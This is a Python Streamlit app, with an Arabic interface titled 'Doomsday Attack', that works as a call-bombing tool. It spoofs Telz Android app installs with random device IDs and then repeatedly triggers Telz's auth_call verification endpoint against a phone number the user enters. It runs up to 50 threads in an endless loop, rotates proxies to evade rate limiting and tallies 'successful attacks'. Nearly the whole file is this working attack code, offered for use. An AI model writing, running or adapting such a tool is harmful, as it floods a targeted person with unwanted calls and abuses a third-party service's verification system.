import streamlit as st
import subprocess
import sys
import random
import time
import uuid
import string
import json
import os
from concurrent.futures import ThreadPoolExecutor

# --- إعدادات الصفحة والواجهة ---
st.set_page_config(page_title="DOOMSDAY ATTACK - GX1Ai", page_icon="💀", layout="wide")

st.markdown("""
    <style>
    #MainMenu {visibility: hidden;}
    footer {visibility: hidden;}
    header {visibility: hidden;}
    .stDeployButton {display:none;}
    .main { background-color: #000000; color: #ff0000; font-family: 'Courier New', Courier, monospace; }
    .stTextInput>div>div>input { background-color: #0a0a0a; color: #ff0000; border: 2px solid #ff0000; text-align: center; }
    .stButton>button { width: 100%; background-color: #660000; color: white; border: 2px solid #ff0000; font-weight: bold; font-size: 20px; }
    .img-container { border: 5px solid #ff0000; padding: 10px; background-color: #1a0000; box-shadow: 0 0 20px #ff0000; text-align: center; }
    </style>
    """, unsafe_allow_html=True)

# --- نظام التفعيل ---
if 'authenticated' not in st.session_state:
    st.session_state.authenticated = False

if not st.session_state.authenticated:
    st.markdown('<div class="img-container"><img src="https://files.catbox.moe/3cq9i1.jpg" style="width:100%"></div>', unsafe_allow_html=True)
    st.markdown("<h1 style='text-align: center; color: red;'>🔒 نظام التفعيل</h1>", unsafe_allow_html=True)
    user_key = st.text_input("أدخل المفتاح:", type="password")
    if st.button("تفعيل 🔥"):
        if user_key == "a":
            st.session_state.authenticated = True
            st.rerun()
        else: st.error("❌ المفتاح خطأ!")
    st.stop()

# --- تثبيت واستيراد المكتبات ---
def install_libs():
    libs = ['requests', 'termcolor', 'pyfiglet']
    for lib in libs:
        try: __import__(lib)
        except ImportError: subprocess.check_call([sys.executable, "-m", "pip", "install", lib])

install_libs()
import requests

# --- قائمة اللغات الشاملة (من كودك المرفق) ---
FOREIGN_LANGS = [
    "en", "fr", "de", "tr", "es", "pt", "it", "ko", "ru", "ja", "zh", "fa", "pl", "uk",
    "ar", "hi", "bn", "id", "ms", "vi", "th", "nl", "sv", "no", "da", "fi", "el", "cs", "hu",
    "ro", "sk", "sl", "sr", "hr", "lt", "lv", "et", "he", "ur", "ta", "te", "ml", "kn", "gu",
    "pa", "mr", "ne", "si", "my", "km", "lo", "am", "sw", "zu", "xh", "ig", "yo", "ha", "af",
    "eu", "gl", "ca", "is", "mk", "bs", "mt", "hy", "ka", "az", "kk", "uz", "mn", "tg", "tk",
    "ky", "ps", "ku", "ug", "sd", "lb", "sq", "be", "bg", "mo", "tt", "cv", "os", "fo", "sm",
    "fj", "to", "rw", "rn", "ny", "ss", "tn", "ts", "st", "ve", "wo", "ln", "kg", "ace", "ady",
    "ain", "akk", "als", "an", "ang", "arq", "arz", "ast", "av", "awa", "ay", "ba", "bal", "bar",
    "bcl", "ber", "bho", "bi", "bjn", "bm", "bo", "bpy", "br", "bsq", "bug", "bxr", "ceb", "ch",
    "cho", "chr", "chy", "ckb", "co", "cr", "crh", "csb", "cu", "cv", "cy", "dak", "dsb", "dv",
    "dz", "ee", "efi", "egy", "elx", "eml", "eo", "es-419", "et", "ext", "ff", "fit", "fj", "fo",
    "frp", "frr", "fur", "fy", "ga", "gaa", "gag", "gan", "gd", "gez", "glk", "gn", "gom", "got",
    "grc", "gsw", "gv", "hak", "haw", "hif", "ho", "hsb", "ht", "hz", "ia", "ie", "ik", "ilo",
    "inh", "io", "jam", "jbo", "jv", "kaa", "kab", "kbd", "kcg", "ki", "kj", "kl", "koi", "kr",
    "krl", "ksh", "kv", "kw", "la", "lad", "lam", "lb", "lez", "li", "lij", "lmo", "ln", "loz",
    "lrc", "ltg", "lv", "mad", "map", "mas", "mdf", "mg", "mh", "min", "mk", "ml", "mn", "mnc",
    "mni", "mos", "mrj", "ms", "mt", "mwl", "myv", "na", "nah", "nap", "nds", "ng", "niu", "nn",
    "no", "nov", "nrm", "nso", "nv", "ny", "nyn", "oc", "om", "or", "os", "pa", "pag", "pam",
    "pap", "pcd", "pdc", "pdt", "pfl", "pi", "pih", "pl", "pms", "pnb", "pnt", "prg", "qu", "qug",
    "raj", "rap", "rgn", "rif", "rm", "rmy", "rn", "roa", "rup", "rw", "sa", "sah", "sc", "scn",
    "sco", "sd", "se", "sg", "sgs", "sh", "shi", "shn", "si", "simple", "sk", "sl", "sli", "sm",
    "sn", "so", "sq", "sr", "srn", "ss", "st", "stq", "su", "sv", "sw", "syc", "szl", "ta", "te",
    "tet", "tg", "th", "ti", "tk", "tl", "tn", "to", "tpi", "tr", "ts", "tt", "tum", "tw", "ty",
    "udm", "ug", "uk", "ur", "uz", "ve", "vec", "vep", "vi", "vls", "vo", "wa", "war", "wo",
    "wuu", "xal", "xh", "xmf", "yi", "yo", "yue", "za", "zea", "zh", "zh-classical", "zh-min-nan",
    "zh-yue", "zu"
]

# --- الدوال الأصلية (بدون حذف أي تفصيل) ---
def generate_unique_ids():
    timestamp = int(time.time() * 1000)
    random_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
    unique_uuid = uuid.uuid4()
    return timestamp, random_id, unique_uuid

def load_proxies(filename="gx1gx1.txt"):
    proxies = []
    if os.path.exists(filename):
        with open(filename, "r") as f:
            proxies = [l.strip() for l in f.read().splitlines() if l.strip()]
    return proxies

def get_random_proxy(proxies):
    if not proxies: return None
    proxy = random.choice(proxies)
    p_url = f"http://{proxy}" if not (proxy.startswith("socks") or proxy.startswith("http")) else proxy
    return {"http": p_url, "https": p_url}

def send_install_request(url, headers, payload, proxy=None):
    try:
        res = requests.post(url, data=payload, headers=headers, proxies=proxy, timeout=10)
        return res.ok and "ok" in res.text
    except: return False

def send_auth_call_request(url, headers, payload, proxy=None):
    try:
        res = requests.post(url, data=payload, headers=headers, proxies=proxy, timeout=10)
        return res.ok and "ok" in res.text
    except: return False

# --- إدارة الحالة الإحصائية ---
if 'stats' not in st.session_state: st.session_state.stats = {"ok": 0, "error": 0}
if 'running' not in st.session_state: st.session_state.running = False

# --- المحرك الأساسي (Worker Task) ---
def worker_task(country_code, number, proxies_list):
    install_url = "https://api.telz.com/app/install"
    auth_call_url = "https://api.telz.com/app/auth_call"
    headers = {'User-Agent': "Telz-Android/17.5.17", 'Content-Type': "application/json"}

    while st.session_state.running: # يعمل طالما الزر مفعل
        foxx, fox, foxer = generate_unique_ids()
        v = str(random.randint(7, 14))
        lang = random.choice(FOREIGN_LANGS)
        proxy = get_random_proxy(proxies_list)

        p_ins = json.dumps({"android_id": fox, "app_version": "17.5.17", "event": "install", "os": "android", "os_version": v, "ts": foxx, "uuid": str(foxer)})
        
        try:
            if send_install_request(install_url, headers, p_ins, proxy):
                p_auth = json.dumps({"android_id": fox, "app_version": "17.5.17", "event": "auth_call", "lang": lang, "phone": f"+{country_code}{number}", "ts": foxx, "uuid": str(foxer)})
                if send_auth_call_request(auth_call_url, headers, p_auth, proxy):
                    st.session_state.stats["ok"] += 1
                else: st.session_state.stats["error"] += 1
            else: st.session_state.stats["error"] += 1
        except: st.session_state.stats["error"] += 1

# --- واجهة المستخدم ---
st.markdown('<div class="img-container"><img src="https://files.catbox.moe/3cq9i1.jpg" style="width:100%"></div>', unsafe_allow_html=True)
st.markdown("<h1 style='text-align: center; color: red;'>هجـوم يوم القيامة - TURBO</h1>", unsafe_allow_html=True)

col1, col2 = st.columns(2)
with col1: c_code = st.text_input("🌍 كود الدولة (بدون +):", value="964")
with col2: num = st.text_input("📱 الرقم (بدون مقدمة):")

threads = st.slider("☣️ القوة (Threads):", 1, 50, 15)
placeholder = st.empty()

if st.button("⚠️ بـدء الهجـوم اللانهائي"):
    if num:
        st.session_state.running = True
        proxies = load_proxies()
        
        # تشغيل المحرك المتوازي
        with ThreadPoolExecutor(max_workers=threads) as executor:
            for _ in range(threads):
                executor.submit(worker_task, c_code, num, proxies)
            
            # تحديث الواجهة بسرعة فائقة
            while st.session_state.running:
                with placeholder.container():
                    st.metric("🔥 هجمات ناجحة", st.session_state.stats["ok"])
                    st.metric("💀 هجمات فاشلة", st.session_state.stats["error"])
                time.sleep(0.1)
    else: st.error("أدخل الرقم!")

if st.button("❌ إيقاف"):
    st.session_state.running = False
    st.rerun()
